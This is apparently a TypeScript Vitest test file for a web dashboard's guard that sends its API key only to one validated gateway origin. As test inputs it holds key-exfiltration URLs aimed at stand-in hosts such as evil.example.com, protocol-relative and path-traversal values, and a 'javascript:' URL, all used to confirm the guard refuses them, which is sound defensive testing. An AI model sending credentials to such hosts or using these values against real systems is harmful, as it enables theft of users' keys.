/**
 * The API key goes to one validated gateway origin and nowhere else (N50;
 * sol's review #2857, findings 1-3).
 *
 * @vitest-environment jsdom
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  fetchWithKey,
  gatewayOrigin,
  installKeyEgressGuard,
  KeyEgressRefused,
  requestCarriesKey,
  resolveGatewayOrigin,
  resolveGatewayTarget,
} from "../gateway-base.js";
import { authorizedFetch } from "../authorized-fetch.js";
import { useAuthStore } from "../../stores/auth-store.js";

const PAGE = window.location.origin;
const KEY = "pcc_test_0123456789abcdef0123456789abcdef";

interface Sent {
  url: string;
  authorization: string | null;
}

let sent: Sent[];

function stubFetch() {
  sent = [];
  const fn = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    sent.push({ url, authorization: new Headers(init?.headers).get("Authorization") });
    return new Response("{}", { status: 200 });
  });
  vi.stubGlobal("fetch", fn);
  return fn;
}

beforeEach(() => {
  vi.spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  useAuthStore.setState({ apiKey: null, isAuthenticated: false });
});

describe("resolveGatewayOrigin: one validated origin (finding 2)", () => {
  it("unset means the page's own origin (the gateway serves the dashboard)", () => {
    expect(resolveGatewayOrigin(undefined, PAGE, true)).toEqual({ ok: true, origin: PAGE });
    expect(resolveGatewayOrigin("  ", PAGE, true)).toEqual({ ok: true, origin: PAGE });
  });

  it("accepts an https URL and keeps only its origin", () => {
    expect(resolveGatewayOrigin("https://capability.network/some/path?x=1", PAGE, true)).toEqual({
      ok: true,
      origin: "https://capability.network",
    });
  });

  it("accepts http on a loopback host only in a dev build", () => {
    expect(resolveGatewayOrigin("http://localhost:3200", PAGE, false)).toEqual({ ok: true, origin: "http://localhost:3200" });
    expect(resolveGatewayOrigin("http://127.0.0.1:3200", PAGE, false)).toEqual({ ok: true, origin: "http://127.0.0.1:3200" });
    expect(resolveGatewayOrigin("http://localhost:3200", PAGE, true).ok).toBe(false);
  });

  it.each([
    ["plain http to another host", "http://gateway.example.com"],
    ["a relative path", "/api"],
    ["no scheme", "capability.network"],
    ["javascript:", "javascript:alert(1)"],
    ["ws:", "ws://capability.network"],
    ["credentials in the URL", "https://user:pass@capability.network"],
  ])("rejects %s", (_label, value) => {
    const r = resolveGatewayOrigin(value, PAGE, false);
    expect(r.ok).toBe(false);
  });

  it("fails closed: a misconfigured VITE_PCC_URL gives no origin at all", () => {
    vi.stubEnv("VITE_PCC_URL", "http://gateway.example.com");
    expect(gatewayOrigin()).toBeNull();
    vi.stubEnv("VITE_PCC_URL", "https://gateway.example.com");
    expect(gatewayOrigin()).toBe("https://gateway.example.com");
  });
});

describe("fetchWithKey: the key goes on a request only for the gateway (finding 1)", () => {
  it("same-origin gateway: the path stays relative and carries the key", async () => {
    stubFetch();
    await fetchWithKey("/api/jobs?limit=5", KEY);
    expect(sent).toEqual([{ url: "/api/jobs?limit=5", authorization: `Bearer ${KEY}` }]);
  });

  it("a configured gateway receives every request, relative ones included", async () => {
    vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    stubFetch();
    await fetchWithKey("/api/jobs", KEY);
    await fetchWithKey("https://gw.example.com/api/kernels", KEY);
    expect(sent.map((s) => s.url)).toEqual(["https://gw.example.com/api/jobs", "https://gw.example.com/api/kernels"]);
    expect(sent.every((s) => s.authorization === `Bearer ${KEY}`)).toBe(true);
  });

  it.each([
    ["another origin", "https://evil.example.com/api/jobs"],
    ["a protocol-relative URL", "//evil.example.com/api/jobs"],
    ["the page origin when the gateway is elsewhere", `${PAGE}/api/jobs`],
  ])("refuses %s before any request is made", async (_label, target) => {
    if (target.startsWith(PAGE)) vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    const fetchFn = stubFetch();
    await expect(fetchWithKey(target, KEY)).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it("refuses everything while VITE_PCC_URL is misconfigured", async () => {
    vi.stubEnv("VITE_PCC_URL", "http://gateway.example.com");
    const fetchFn = stubFetch();
    await expect(fetchWithKey("/api/jobs", KEY)).rejects.toThrow(/misconfigured/);
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it('a path that normalises to "//host" stays on the gateway', () => {
    const r = resolveGatewayTarget("/..//evil.example.com/x");
    expect(r.ok).toBe(true);
    if (r.ok) expect(new URL(r.url, PAGE).origin).toBe(PAGE);
  });

  it("without a key, sends no Authorization header", async () => {
    stubFetch();
    await fetchWithKey("/api/health", null);
    expect(sent[0]!.authorization).toBeNull();
  });

  it("authorizedFetch attaches the signed-in key, and only for the gateway", async () => {
    useAuthStore.setState({ apiKey: KEY, isAuthenticated: true });
    const fetchFn = stubFetch();
    await authorizedFetch("/api/agents/me");
    expect(sent).toEqual([{ url: "/api/agents/me", authorization: `Bearer ${KEY}` }]);
    await expect(authorizedFetch("https://evil.example.com/steal")).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(fetchFn).toHaveBeenCalledTimes(1);
  });

  it("the refusal names origin and path, never the query string", async () => {
    stubFetch();
    await expect(fetchWithKey(`https://evil.example.com/x?key=${KEY}`, KEY)).rejects.toThrow(
      /^Refused to send the API key to https:\/\/evil\.example\.com\/x: /,
    );
    await expect(fetchWithKey(`https://evil.example.com/x?key=${KEY}`, KEY)).rejects.not.toThrow(KEY);
  });
});

describe("requestCarriesKey", () => {
  const legacy = "legacy-stored-key-0123456789";
  it.each([
    ["a Bearer header", "https://x.example/a", { headers: { Authorization: `Bearer ${KEY}` } }, null],
    ["another header", "https://x.example/a", { headers: { "X-Api-Key": KEY } }, null],
    ["the URL", `https://x.example/a?key=${KEY}`, undefined, null],
    ["a string body", "https://x.example/a", { method: "POST", body: JSON.stringify({ apiKey: KEY }) }, null],
    ["the stored key in a legacy format", "https://x.example/a", { headers: { Authorization: `Bearer ${legacy}` } }, legacy],
  ])("sees a key in %s", (_label, url, init, stored) => {
    expect(requestCarriesKey(url, init as RequestInit | undefined, stored)).toBe(true);
  });

  it("sees a key on a Request object", () => {
    expect(requestCarriesKey(new Request("https://x.example/a", { headers: { Authorization: `Bearer ${KEY}` } }), undefined, null)).toBe(true);
  });

  it("ignores requests without a key, and a stored value too short to be one", () => {
    expect(requestCarriesKey("https://x.example/a", { headers: { "Content-Type": "application/json" } }, null)).toBe(false);
    expect(requestCarriesKey("https://x.example/a", { body: "a" }, "a")).toBe(false);
  });
});

describe("installKeyEgressGuard: the backstop for call sites that build headers themselves (finding 3)", () => {
  let underlying: ReturnType<typeof stubFetch>;
  let uninstall: () => void;

  beforeEach(() => {
    underlying = stubFetch();
    uninstall = installKeyEgressGuard(() => useAuthStore.getState().apiKey);
  });

  afterEach(() => uninstall());

  it("rejects the stored key on its way to another origin", async () => {
    const stored = "legacy-stored-key-0123456789";
    useAuthStore.setState({ apiKey: stored, isAuthenticated: true });
    await expect(
      window.fetch("https://evil.example.com/api/jobs", { headers: { Authorization: `Bearer ${stored}` } }),
    ).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("rejects any PCC key, however it is carried, to another origin", async () => {
    await expect(window.fetch("http://localhost:3200/api/capabilities", { headers: { "X-Api-Key": KEY } })).rejects.toBeInstanceOf(
      KeyEgressRefused,
    );
    await expect(window.fetch(`https://evil.example.com/?k=${KEY}`)).rejects.toBeInstanceOf(KeyEgressRefused);
    await expect(
      window.fetch(new Request("https://evil.example.com/a", { headers: { Authorization: `Bearer ${KEY}` } })),
    ).rejects.toBeInstanceOf(KeyEgressRefused);
    expect(underlying).not.toHaveBeenCalled();
  });

  it("lets the key through to the gateway, and lets keyless requests go anywhere", async () => {
    await window.fetch("/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } });
    await window.fetch("https://us.i.posthog.com/e/", { method: "POST", body: '{"event":"pageview"}' });
    expect(sent.map((s) => s.url)).toEqual(["/api/jobs", "https://us.i.posthog.com/e/"]);
  });

  it("follows a configured gateway: the page origin no longer gets the key", async () => {
    vi.stubEnv("VITE_PCC_URL", "https://gw.example.com");
    await expect(window.fetch("/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } })).rejects.toBeInstanceOf(
      KeyEgressRefused,
    );
    await window.fetch("https://gw.example.com/api/jobs", { headers: { Authorization: `Bearer ${KEY}` } });
    expect(sent.map((s) => s.url)).toEqual(["https://gw.example.com/api/jobs"]);
  });

  it("is installed once, and uninstalls cleanly", () => {
    const guarded = window.fetch;
    const second = installKeyEgressGuard(() => null);
    expect(window.fetch).toBe(guarded);
    second();
    expect(window.fetch).toBe(guarded);
    uninstall();
    expect(window.fetch).toBe(underlying);
    uninstall = () => {};
  });
});
